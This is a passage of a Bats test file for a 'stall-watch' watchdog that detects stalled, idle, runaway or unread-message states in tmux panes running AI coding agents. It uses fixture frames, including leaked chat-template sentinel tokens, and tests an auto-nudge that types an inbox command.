  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine pi "${runaway_flags[@]}"
  run bash -c "bus | grep -c 'runaway:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D7 ignores sentinel strings inside a claude tool-result block" {
  a=$(fx_claude_tool_sentinel 10.0k)
  b=$(fx_claude_tool_sentinel 12.0k)
  c=$(fx_claude_tool_sentinel 14.0k)
  d=$(fx_claude_tool_sentinel 16.0k)
  stall_sampler "$a" "$b" "$c" "$d" "$d"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude "${runaway_flags[@]}"
  run bash -c "bus | grep -c 'runaway:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D7 ignores sentinel strings inside pi tool output" {
  a=$(fx_pi_tool_sentinel 19.0k)
  b=$(fx_pi_tool_sentinel 21.0k)
  c=$(fx_pi_tool_sentinel 23.0k)
  d=$(fx_pi_tool_sentinel 25.0k)
  stall_sampler "$a" "$b" "$c" "$d" "$d"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine pi "${runaway_flags[@]}"
  run bash -c "bus | grep -c 'runaway:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D7 ignores a long legitimate claude answer" {
  a=$(fx_claude_long_answer 10.0k)
  b=$(fx_claude_long_answer 13.0k)
  c=$(fx_claude_long_answer 16.0k)
  d=$(fx_claude_long_answer 19.0k)
  stall_sampler "$a" "$b" "$c" "$d" "$d"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude "${runaway_flags[@]}"
  run bash -c "bus | grep -c 'runaway:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D7 clears when the sentinel leaves the frame" {
  a=$(fx_pi_runaway 19.0k)
  b=$(fx_pi_runaway 19.8k)
  c=$(fx_pi_runaway 20.5k)
  d=$(fx_pi_runaway 21.2k)
  e=$(fx_pi_busy 21.5k)
  stall_sampler "$a" "$b" "$c" "$d" "$e" "$e"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine pi "${runaway_flags[@]}"
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 2 ]
  [[ "${lines[0]}" == "blocked|runaway:"* ]]
  [ "${lines[1]}" = "working|runaway: cleared" ]
}

# fx_claude_runaway <tokens> — sentinel streamed in the newest assistant block.
fx_claude_runaway() {
  frame_file "claude_runaway.$1" <<EOF
⏺ Read(adapters/core/crew.sh)
  ⎿  line one

     <|im_end|> after a blank line inside the tool block
> please do not mention <|endoftext|> in your answer
⏺ I'll trust inspection <｜end▁of▁thinking｜> dragon phoenix griffin kraken quark
✳ Perusing… (1m 2s · ↓ $1 tokens · thinking)
EOF
}

fx_claude_stale_sentinel() {
  frame_file "claude_stale.$1" <<EOF
> please do not mention <|endoftext|> in your answer
⏺ Bash(grep -n '<|im_end|>' crew.sh)
  ⎿  crew.sh:12:<|im_end|>

     <|im_end|> after a blank line
⏺ Done reading; updating the detector now.
✳ Perusing… (1m 2s · ↓ $1 tokens · thinking)
EOF
}

@test "stall-watch: D7 posts runaway: on a claude frame with a streamed sentinel" {
  a=$(fx_claude_runaway 10.0k)
  b=$(fx_claude_runaway 11.0k)
  c=$(fx_claude_runaway 12.0k)
  d=$(fx_claude_runaway 13.0k)
  stall_sampler "$a" "$b" "$c" "$d" "$d"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude "${runaway_flags[@]}"
  run bash -c "bus | grep -c 'runaway:' || true"
  [ "$output" = "1" ]
}

@test "stall-watch: D7 ignores stale sentinels in input rows, tool headers and blank-split tool output" {
  a=$(fx_claude_stale_sentinel 10.0k)
  b=$(fx_claude_stale_sentinel 12.0k)
  c=$(fx_claude_stale_sentinel 14.0k)
  d=$(fx_claude_stale_sentinel 16.0k)
  stall_sampler "$a" "$b" "$c" "$d" "$d"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude "${runaway_flags[@]}"
  run bash -c "bus | grep -c 'runaway:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D7 survives a sentinel frame with no token meter" {
  p=$(frame_file no_meter <<<'⏺ done <|im_end|>')
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude "${runaway_flags[@]}"
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c 'runaway:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D3 posts blocked/quiet: on a byte-identical pane in steady state" {
  # --max-life 8: D3 needs `quiet_for >= --idle 2`, and the run must still be
  # alive when it fires; at 4 one stretched pre-sample gap could exit the loop
  # first and starve the single expected event (#185, same as D0's fix above).
  p=$(fx_idle_box)
  stall_sampler "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 999 --max-life 8
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|quiet: pane unchanged for "* ]]
}

@test "stall-watch: D5 flags a pane still a shell past --launch as launch-not-started" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  export CREW_STALL_PROC_CMD='printf fish'
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --launch 2 --window 60 --stall 999 --idle 999 --dead 999 --max-life 6
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.source)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|watchdog|stalled: launch-not-started"* ]]
}

@test "stall-watch: D5 clears itself when the engine appears late" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  # The engine appears from the 4th sample on, once D5 has posted.
  export CREW_STALL_PROC_CMD="[ \"\$(cat $SAMPLER_DIR/n)\" -ge 4 ] && printf claude || printf fish"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --launch 1 --window 60 --stall 999 --idle 999 --dead 999 --max-life 9
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 2 ]
  [[ "${lines[0]}" == "blocked|stalled: launch-not-started"* ]]
  [ "${lines[1]}" = "working|stalled: launch-not-started cleared" ]
}

@test "stall-watch: D5 is silent when the engine is the pane's command" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  export CREW_STALL_PROC_CMD='printf .claude-wrapped'
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --launch 1 --window 60 --stall 999 --idle 999 --dead 999 --max-life 5
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D5 is silent while a shell pane is inside --launch" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  export CREW_STALL_PROC_CMD='printf fish'
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --launch 999 --window 60 --stall 999 --idle 999 --dead 999 --max-life 4
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D6 flags a working lead with an undelivered role verdict" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  seed_raw worker:feat/x#s1-1 working "" ""
  seed_msg role:feat/x:reviewer worker:feat/x#s1-1 30
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude \
    --grace 0 --interval 1 --unread 10 --window 0 --stall 999 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.kind==\"status\" and .body.source==\"watchdog\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|unread: "* ]]
}

@test "stall-watch: D6 is silent once the verdict is delivered" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  seed_raw worker:feat/x#s1-1 working "" ""
  seed_msg role:feat/x:reviewer worker:feat/x#s1-1 30
  run run_crew inbox worker:feat/x#s1-1 c1
  [ "$status" -eq 0 ]
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude \
    --grace 0 --interval 1 --unread 10 --window 0 --stall 999 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.kind==\"status\" and .body.source==\"watchdog\")' | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D6 is silent while the verdict is younger than --unread" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  seed_raw worker:feat/x#s1-1 working "" ""
  seed_msg role:feat/x:reviewer worker:feat/x#s1-1 1
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude \
    --grace 0 --interval 1 --unread 999 --window 0 --stall 999 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.kind==\"status\" and .body.source==\"watchdog\")' | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D6 is silent when the lead is not working" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  seed_raw worker:feat/x#s1-1 pr_open "" ""
  seed_msg role:feat/x:reviewer worker:feat/x#s1-1 30
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude \
    --grace 0 --interval 1 --unread 10 --window 0 --stall 999 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.kind==\"status\" and .body.source==\"watchdog\")' | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D6 ignores a verdict the lead already answered" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  seed_raw worker:feat/x#s1-1 working "" ""
  seed_msg role:feat/x:reviewer worker:feat/x#s1-1 30
  seed_msg worker:feat/x#s1-1 role:feat/x:reviewer 20
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude \
    --grace 0 --interval 1 --unread 10 --window 0 --stall 999 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.kind==\"status\" and .body.source==\"watchdog\")' | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D6 clears itself once the verdict is delivered" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  seed_raw worker:feat/x#s1-1 working "" ""
  seed_msg role:feat/x:reviewer worker:feat/x#s1-1 30
  # The lead reads its inbox just before the 3rd sample, after D6 has posted.
  export CREW_STALL_SAMPLE_CMD="[ \"\$(cat $SAMPLER_DIR/n)\" != 2 ] || bash $CREW inbox worker:feat/x#s1-1 c1 >/dev/null; $CREW_STALL_SAMPLE_CMD"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude \
    --grace 0 --interval 1 --unread 10 --window 0 --stall 999 --idle 999 --dead 999 --max-life 9
  run bash -c "bus | jq -r 'select(.kind==\"status\" and .body.source==\"watchdog\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 2 ]
  [[ "${lines[0]}" == "blocked|unread: "* ]]
  [ "${lines[1]}" = "working|unread: cleared" ]
}

@test "stall-watch: D6 is silent for a branch-keyed watchdog" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  seed_raw worker:feat/x working "" ""
  seed_msg role:feat/x:reviewer worker:feat/x#s1-1 30
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --unread 10 --window 0 --stall 999 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.kind==\"status\" and .body.source==\"watchdog\")' | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D6 flags a working lead with an undelivered dispatcher directive" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  seed_raw worker:feat/x#s1-1 working "" ""
  seed_msg dispatcher:c1 worker:feat/x#s1-1 30
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude --no-nudge \
    --grace 0 --interval 1 --unread 10 --window 0 --stall 999 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.kind==\"status\" and .body.source==\"watchdog\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|unread: dispatcher directive "* ]]
}

@test "stall-watch: D6 clears a dispatcher directive once delivered" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  seed_raw worker:feat/x#s1-1 working "" ""
  seed_msg dispatcher:c1 worker:feat/x#s1-1 30
  export CREW_STALL_SAMPLE_CMD="[ \"\$(cat $SAMPLER_DIR/n)\" != 2 ] || bash $CREW inbox worker:feat/x#s1-1 c1 >/dev/null; $CREW_STALL_SAMPLE_CMD"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude --no-nudge \
    --grace 0 --interval 1 --unread 10 --window 0 --stall 999 --idle 999 --dead 999 --max-life 9
  run bash -c "bus | jq -r 'select(.kind==\"status\" and .body.source==\"watchdog\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 2 ]
  [[ "${lines[0]}" == "blocked|unread: dispatcher directive"* ]]
  [ "${lines[1]}" = "working|unread: cleared" ]
}

@test "stall-watch: D6 keeps a dispatcher directive blocked while undelivered" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  seed_raw worker:feat/x#s1-1 working "" ""
  seed_msg dispatcher:c1 worker:feat/x#s1-1 30
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude --no-nudge \
    --grace 0 --interval 1 --unread 10 --window 0 --stall 999 --idle 999 --dead 999 --max-life 9
  run bash -c "bus | jq -r 'select(.kind==\"status\" and .body.source==\"watchdog\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|unread: dispatcher directive"* ]]
}

@test "stall-watch: D6 does not treat a lead msg to the dispatcher as handling a directive" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  seed_raw worker:feat/x#s1-1 working "" ""
  seed_msg dispatcher:c1 worker:feat/x#s1-1 30
  seed_msg worker:feat/x#s1-1 dispatcher:c1 20
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude --no-nudge \
    --grace 0 --interval 1 --unread 10 --window 0 --stall 999 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.kind==\"status\" and .body.source==\"watchdog\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|unread: dispatcher directive "* ]]
}

@test "stall-watch: D6 relabels the episode when only the role verdict is delivered" {
  p=$(fx_idle_box)
  stall_sampler "$p"
  seed_raw worker:feat/x#s1-1 working "" ""
  seed_msg role:feat/x:reviewer worker:feat/x#s1-1 40
  seed_msg dispatcher:c1 worker:feat/x#s1-1 30
  export CREW_STALL_SAMPLE_CMD="[ \"\$(cat $SAMPLER_DIR/n)\" != 2 ] || CREW_ID=c1 bash $CREW await worker:feat/x#s1-1 --from role:feat/x:reviewer --timeout 1 >/dev/null; $CREW_STALL_SAMPLE_CMD"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude --no-nudge \
    --grace 0 --interval 1 --unread 10 --window 0 --stall 999 --idle 999 --dead 999 --max-life 13
  run bash -c "bus | jq -r 'select(.kind==\"status\" and .body.source==\"watchdog\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 3 ]
  [[ "${lines[0]}" == "blocked|unread: role verdict "* ]]
  [ "${lines[1]}" = "working|unread: cleared" ]
  [[ "${lines[2]}" == "blocked|unread: dispatcher directive "* ]]
}

# d6_nudge_sampler <idle> <typed> <after> [busy-calls] — after _nudge_setup: %9's
# frame follows the stub's send-keys log (idle until the line is typed, typed
# until the Enter, then after), so loop samples and nudge captures share one
# source. The first [busy-calls] samples show a live meter instead. With
# D6_INBOX set, the lead reads its inbox on the 3rd sample after the Enter —
# past the nudge's own after-captures, i.e. on the next loop tick.
d6_nudge_sampler() {
  local d="$BATS_TEST_TMPDIR/d6nudge"
  mkdir -p "$d"
  cp "$1" "$d/idle"
  cp "$2" "$d/typed"
  cp "$3" "$d/after"
  cp "$(fx_meter 2s 1.2k)" "$d/busy"
  printf '%s' "${4:-0}" >"$d/busy_n"
  printf '0' >"$d/n"
  printf '0' >"$d/after_n"
  cat >"$d/sample" <<EOS
#!/usr/bin/env bash
d="$d"
n=\$((\$(cat "\$d/n") + 1))
printf '%s' "\$n" >"\$d/n"
if [ "\$n" -le "\$(cat "\$d/busy_n")" ]; then
  cat "\$d/busy"
elif grep -q '^send-keys -t %9 Enter' "\$STUB_LOG" 2>/dev/null; then
  a=\$((\$(cat "\$d/after_n") + 1))
  printf '%s' "\$a" >"\$d/after_n"
  [ "\$a" != 3 ] || [ -z "\${D6_INBOX:-}" ] || bash "$CREW" inbox 'worker:feat/x#s1-1' c1 >/dev/null
  cat "\$d/after"
elif grep -q '^send-keys -t %9 -l' "\$STUB_LOG" 2>/dev/null; then
  cat "\$d/typed"
else
  cat "\$d/idle"
fi
EOS
  chmod +x "$d/sample"
  export CREW_STALL_SAMPLE_CMD="$d/sample"
}

d6_watch() { # [extra stall-watch flags] — 4 D6 ticks (0, 4, 8, 12)
  CREW_ID=c1 run run_crew stall-watch 'worker:feat/x#s1-1' --pane %9 --engine "${D6_ENGINE:-claude}" \
    --grace 0 --interval 1 --unread 10 --window 0 --stall 999 --idle 999 --dead 999 --max-life 13 "$@"
}
d6_rows() { bus | jq -r 'select(.kind=="status" and .body.source=="watchdog") | "\(.body.state)|\(.body.detail)"'; }

@test "stall-watch: D6 auto-nudges an idle lead once and skips that tick's unread: post" {
  _nudge_setup
  seed_raw 'worker:feat/x#s1-1' working "" ""
  _nudge_directive
  d6_nudge_sampler "$(fx_done_idle)" "$(fx_nudge_typed)" "$(fx_done_idle)"
  D6_INBOX=1 d6_watch
  [ "$(nudge_keys)" = "$(printf '%s\n' 'send-keys -t %9 -l crew inbox "$CREW_WORKER_ID"' 'send-keys -t %9 Enter')" ]
  [ "$(nudge_rows | jq -r '"\(.from) \(.result)"')" = "watchdog accepted" ]
  run d6_rows
  [[ "$output" != *"blocked|unread:"* ]]
}

@test "stall-watch: D6 types an undelivered directive's nudge only once" {
  _nudge_setup
  seed_raw 'worker:feat/x#s1-1' working "" ""
  _nudge_directive
  # Accepted, but the lead never reads: later D6 ticks must not re-type.
  d6_nudge_sampler "$(fx_done_idle)" "$(fx_nudge_typed)" "$(fx_done_idle)"
  d6_watch
  [ "$(nudge_keys | wc -l)" -eq 2 ]
  [ "$(nudge_rows | wc -l)" -eq 1 ]
}

@test "stall-watch: D6 does not re-type a directive another nudge already covered" {
  _nudge_setup
  seed_raw 'worker:feat/x#s1-1' working "" ""
  _nudge_directive
  jq -nc --argjson m "$(bus | jq -r 'select(.kind=="msg") | .ts')" \
    '{ts:($m + 1), crew_id:"c1", kind:"nudge", from:"dispatcher:c1", to:"worker:feat/x#s1-1",
      branch:"feat/x", pane:"%9", engine:"claude", result:"held", detail:"", msg_ts:$m}' >>"$ndir/events.jsonl"
  d6_nudge_sampler "$(fx_done_idle)" "$(fx_nudge_typed)" "$(fx_done_idle)"
  d6_watch
  [ -z "$(nudge_keys)" ]
  [ "$(nudge_rows | wc -l)" -eq 1 ]
}

@test "stall-watch: D6 does not nudge a lead mid-turn and posts as before" {
  _nudge_setup
  seed_raw 'worker:feat/x#s1-1' working "" ""
  _nudge_directive
  d6_nudge_sampler "$(fx_meter 2s 1.2k)" "$(fx_nudge_typed)" "$(fx_done_idle)"
  d6_watch
  [ -z "$(nudge_keys)" ]
  [ -z "$(nudge_rows)" ]
  run d6_rows
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|unread: dispatcher directive undelivered for "*"has not reached a peek seam"* ]]
}

@test "stall-watch: D6 does not nudge with --no-nudge" {
  _nudge_setup
  seed_raw 'worker:feat/x#s1-1' working "" ""
  _nudge_directive
  d6_nudge_sampler "$(fx_done_idle)" "$(fx_nudge_typed)" "$(fx_done_idle)"
  d6_watch --no-nudge
  [ -z "$(nudge_keys)" ]
  [ -z "$(nudge_rows)" ]
}

@test "stall-watch: D6 does not nudge for a role verdict" {
  _nudge_setup
  seed_raw 'worker:feat/x#s1-1' working "" ""
  seed_msg role:feat/x:reviewer 'worker:feat/x#s1-1' 30
  d6_nudge_sampler "$(fx_done_idle)" "$(fx_nudge_typed)" "$(fx_done_idle)"
  d6_watch
  [ -z "$(nudge_keys)" ]
  [ -z "$(nudge_rows)" ]
  run d6_rows
  [[ "${lines[0]}" == "blocked|unread: role verdict "* ]]
}

@test "stall-watch: D6 reports a typed-but-unaccepted auto-nudge once" {
  _nudge_setup
  seed_raw 'worker:feat/x#s1-1' working "" ""
  _nudge_directive
  # The line still sits in the box after the Enter: held.
  d6_nudge_sampler "$(fx_done_idle)" "$(fx_nudge_typed)" "$(fx_nudge_typed)"
  d6_watch
  [ "$(nudge_keys | wc -l)" -eq 2 ]
  [ "$(nudge_rows | jq -r '"\(.from) \(.result)"')" = "watchdog held" ]
  run d6_rows
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|unread: dispatcher directive undelivered for "*"auto-nudge typed but not accepted (nudge held: %9 worker:feat/x#s1-1); verify the pane with crew where" ]]
}

@test "stall-watch: D6 reports an unaccepted auto-nudge inside its own open unread: episode" {
  _nudge_setup
  seed_raw 'worker:feat/x#s1-1' working "" ""
  _nudge_directive
  # Mid-turn on the first D6 tick (episode opens), idle by the next one.
  d6_nudge_sampler "$(fx_done_idle)" "$(fx_done_idle)" "$(fx_done_idle)" 4
  d6_watch
  [ "$(nudge_keys)" = 'send-keys -t %9 -l crew inbox "$CREW_WORKER_ID"' ]
  [ "$(nudge_rows | jq -r .result)" = unconfirmed ]
  run d6_rows
  [ "${#lines[@]}" -eq 2 ]
  [[ "${lines[0]}" == "blocked|unread: dispatcher directive "*"has not reached a peek seam"* ]]
  [[ "${lines[1]}" == "blocked|unread: "*"auto-nudge typed but not accepted (nudge unconfirmed: %9 "* ]]
}

@test "stall-watch: D6 stops auto-nudging after an anchor refusal" {
  _nudge_setup claude zsh
  seed_raw 'worker:feat/x#s1-1' working "" ""
  _nudge_directive
  d6_nudge_sampler "$(fx_done_idle)" "$(fx_nudge_typed)" "$(fx_done_idle)"
  d6_watch
  [ -z "$(nudge_keys)" ]
  [ -z "$(nudge_rows)" ]
  [ "$(grep -c '^list-windows' "$STUB_LOG")" -eq 1 ]
  run d6_rows
  [[ "${lines[0]}" == "blocked|unread: dispatcher directive "* ]]
}

@test "stall-watch: a finished turn waiting on a background shell posts nothing" {
  a=$(fx_bgwait_crunched)
  b=$(fx_bgwait_churned)
  stall_sampler "$a" "$a" "$a" "$b" "$b" "$b" "$b" GONE
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 60 --stall 1 --idle 2 --dead 2 --max-life 15
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: a finished turn with no background shell still posts stalled:" {
  p=$(fx_bgwait_noshell)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 60 --stall 1 --idle 999 --dead 999 --max-life 8
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [ "${lines[0]}" = "blocked|stalled: no output for 1s" ]
}

@test "stall-watch: a live spinner under a stale done line is not a background-shell wait" {
  p=$(frame_file bgwait_spinner <<'EOF'
✻ Crunched for 1m 12s · done 11:16 AM · 1 shell still running
✻ Pondering… (3s)
──────────────────
❯
  -- INSERT -- ⏵⏵ auto mode on · 1 shell · ← for agents
EOF
)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 60 --stall 1 --idle 999 --dead 999 --max-life 8
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${lines[0]}" = "blocked|stalled: no output for 1s" ]
}

@test "stall-watch: a background-shell wait past --bg-wait still reaches quiet:" {
  p=$(fx_bgwait_crunched)
  stall_sampler "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --bg-wait 3 --dead 999 --max-life 8
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|quiet: pane unchanged for "* ]]
}

@test "stall-watch: healthy subagent batch produces ZERO events" {
  # A1's measured false-positive driver, verbatim: meter present, clock rising,
  # parent token string static at 73.2k, live subagent row throughout. D2 is
  # vetoed by the row, D3 by the byte changes, D1 by the meter.
  # Every frame before GONE is byte-distinct ON PURPOSE: the detector
  # thresholds are wall-clock (`date +%s`) deltas, so one stretched
  # inter-sample gap satisfies `--idle 2` — a repeated final frame let D3 post
  # `quiet:` and flake this zero-events oracle under `bats --jobs` load (#185).
  a=$(fx_subbatch "26m 57s" "3m 29s")
  b=$(fx_subbatch "27m 12s" "3m 45s")
  c=$(fx_subbatch "27m 27s" "4m 0s")
  d=$(fx_subbatch "27m 42s" "4m 15s")
  e=$(fx_subbatch "27m 58s" "4m 30s")
  f=$(fx_subbatch "28m 13s" "4m 45s")
  # GONE ends the run on sample exhaustion, not a --max-life race (#169).
  stall_sampler "$a" "$b" "$c" "$d" "$e" "$f" GONE
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 2 --max-life 15
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: the subagent-row veto survives LC_ALL=C" {
  # C-5: a single-character bracket expression consumes one BYTE under LC_ALL=C,
  # so a non-multibyte-safe class would never match `◯` and D2 would lose its
  # only measured guard — silently.
  a=$(fx_subbatch "26m 57s" "3m 29s")
  b=$(fx_subbatch "27m 12s" "3m 45s")
  c=$(fx_subbatch "27m 27s" "4m 0s")
  # The sampler repeats its last frame, so the pane goes byte-static here where
  # test 3a's does not: --idle 3 against a 4s life keeps that from arming D3, so
  # a non-zero count can only mean the veto failed.
  stall_sampler "$a" "$b" "$c" "$c" "$c"
  LC_ALL=C CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 3 --dead 999 --max-life 4
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: a meter with rising tokens produces ZERO events" {
  a=$(fx_meter "5m 29s" "25.0k")
  b=$(fx_meter "5m 44s" "26.1k")
  c=$(fx_meter "5m 59s" "27.4k")
  d=$(fx_meter "6m 14s" "28.8k")
  # GONE stops the sampler repeating its last frame: an un-GONE'd tail would
  # sample `d` twice, and one stretched wall-clock gap meets `--idle 2` and
  # lets D3 post, breaking the zero-events oracle (#185). The run exits on
  # --max-life 5 with fails=1 here, which is fine — the oracle only needs the
  # detectors silent.
  stall_sampler "$a" "$b" "$c" "$d" GONE
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 999 --max-life 5
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: a working heartbeat damps D2" {
  CREW_ID=c1 run_crew status worker:feat/x working
  a=$(fx_meter "5m 29s" "25.0k")
  b=$(fx_meter "5m 44s" "25.0k")
  c=$(fx_meter "5m 59s" "25.0k")
  # A heartbeat buys the window exactly one tick, so the tick has to be wider
  # than the one-second truncation slop for the difference to be observable:
  # without the damping the second sample fires at 3s, with it nothing fires
  # before the 6s life runs out.
  stall_sampler "$a" "$b" "$c" "$c"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 3 --window 0 --idle 3 --dead 999 --max-life 6
  run bash -c "bus | grep -c 'watchdog' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: a self-reported blocked suppresses every detector" {
  CREW_ID=c1 run_crew status worker:feat/x blocked "which approach?"
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 60 --stall 1 --idle 2 --dead 999 --max-life 4
  run bash -c "bus | grep -c 'watchdog' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: a prompt frame in scrollback produces ZERO events, both footers" {
  for fx in fx_prompt_scrollback fx_select_scrollback; do
    rm -f "$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
    p=$($fx)
    stall_sampler "$p" "$p" "$p" "$p"
    CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
      --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
    run bash -c "bus | grep -c . || true"
    [ "$output" = "0" ]
  done
}

@test "stall-watch: codex leaves an uncaptured Claude prompt frame to startup silence" {
